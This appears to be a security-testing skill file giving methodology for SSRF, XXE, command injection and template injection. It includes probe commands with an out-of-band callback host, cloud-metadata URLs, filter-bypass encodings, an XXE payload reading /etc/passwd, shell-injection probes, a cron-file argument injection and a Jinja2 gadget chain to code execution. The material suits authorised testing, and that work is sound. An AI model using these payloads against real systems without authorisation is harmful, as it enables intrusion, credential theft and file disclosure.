---
name: ssrf-xxe-injection
description: Original methodology for SSRF, XXE, command injection, and template injection.
---

# SSRF, XXE, Command Injection, SSTI

## SSRF (Server-Side Request Forgery)

Any feature where the server fetches a URL on the caller's behalf is a
candidate: webhooks, "import from URL", PDF/screenshot generators,
image-proxy/thumbnail endpoints, SSO metadata fetchers, link-preview
features.

**Run it.** `native/ssrf_probe.py` exercises the candidate param three ways —
in-band cloud-metadata (AWS/GCP/Azure/DO/Alibaba built in), filter-bypass
encodings (127.1, `0x7f000001`, `[::1]`, decimal, `@`-tricks), and out-of-band:

```bash
# in-band + bypass (reflected SSRF confirms with no setup):
python3 native/ssrf_probe.py -u "https://app/fetch?url=X" --param url
# blind SSRF — wire an OOB callback (Burp Collaborator / interactsh) to confirm:
python3 native/ssrf_probe.py -u "https://app/proxy" -X POST --location json \
    --param target --json '{"target":"x"}' --callback http://<id>.oast.fun
```

Blind SSRF is invisible in-band — always run with `--callback` for a real test.
`native/http_recon.py` is the recon pass that finds these params in the first place.

- **Probe with a URL you control** (a request-bin style endpoint, or a
  local listener if testing an internal target) to confirm outbound
  requests actually happen and see exactly what gets sent (headers,
  method, whether redirects are followed).
- **Cloud metadata endpoints are the highest-value target**:
  `http://169.254.169.254/latest/meta-data/` (AWS),
  `http://169.254.169.254/computeMetadata/v1/` (GCP, needs
  `Metadata-Flavor: Google` header — note some SSRF vectors let you set
  headers, most don't, so this often fails even when the base SSRF works),
  `http://169.254.169.254/metadata/instance` (Azure, needs
  `Metadata: true`).
- **Bypass naive allowlist/blocklist filters**: alternate IP encodings
  (decimal `2130706433` = `127.0.0.1`, octal, IPv6 `::1` or
  `::ffff:127.0.0.1`), DNS rebinding (a domain that resolves to an allowed
  IP at check-time and an internal IP at request-time), open redirects on
  an allowed domain that bounce to a disallowed target, and URL-parser
  differentials (the validating code and the requesting code disagree on
  what host a malformed URL like `http://allowed.com@internal-host/`
  actually points to).

## XXE (XML External Entity)

Any endpoint parsing XML (including SVG, DOCX/XLSX which are ZIP+XML,
SAML responses, RSS/Atom ingestion) with an XML parser that hasn't
disabled external entity resolution.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```
- If direct entity output isn't reflected, use **out-of-band (OOB) XXE**:
  point the entity at a URL you control and watch for the callback, or use
  a parameter entity to exfiltrate data via DNS/HTTP even when the
  response body never shows the entity's value directly.
- Test **billion-laughs**-style recursive entity expansion separately as a
  DoS vector, not an info-disclosure one — different impact, different
  writeup.

## Command Injection

Look for any shell-out (`os.system`, `subprocess` with `shell=True`,
backtick execution in scripting languages, `eval`) fed by user input,
especially in "convenience" features — file conversion, ping/traceroute
diagnostic tools, git/archive operations.

- Confirm with time-based proof first (`; sleep 5` / `| sleep 5` /
  `` `sleep 5` `` depending on shell context) before assuming output
  reflection — many injectable points don't echo command output directly.
- **Argument injection** is a distinct, easy-to-miss variant: even without
  full shell metacharacter injection, an attacker-controlled value passed
  as a CLI *argument* (not just command string) can smuggle in flags the
  program wasn't meant to accept (e.g. `--output=/etc/cron.d/x` on a tool
  that takes a filename parameter). Check argument boundaries, not just
  shell metacharacters.

## SSTI (Server-Side Template Injection)

Template engines (Jinja2, Twig, FreeMarker, Velocity, Handlebars) that
render user input as template syntax, not just as data.

- Fingerprint first with a math-only polyglot payload (`${7*7}`,
  `{{7*7}}`, `#{7*7}`) — the exact syntax that evaluates to `49` narrows
  the engine.
- Escalation path (Jinja2 example, the most common in Python stacks):
  string→class→base classes→subclasses walk
  (`''.__class__.__mro__[1].__subclasses__()`) to reach a class with
  `os` access, ending in RCE — the general pattern (reflection-based
  sandbox escape) applies across most Python/Ruby template engines even
  when the exact gadget chain differs.

## Validation bar

SSRF: an actual response body from the internal/forbidden target, or a
confirmed OOB callback — not "the request took slightly longer." XXE: an
actual file contents or a confirmed OOB exfiltration. Command/SSTI: actual
command output or a confirmed timing side-channel across multiple samples.
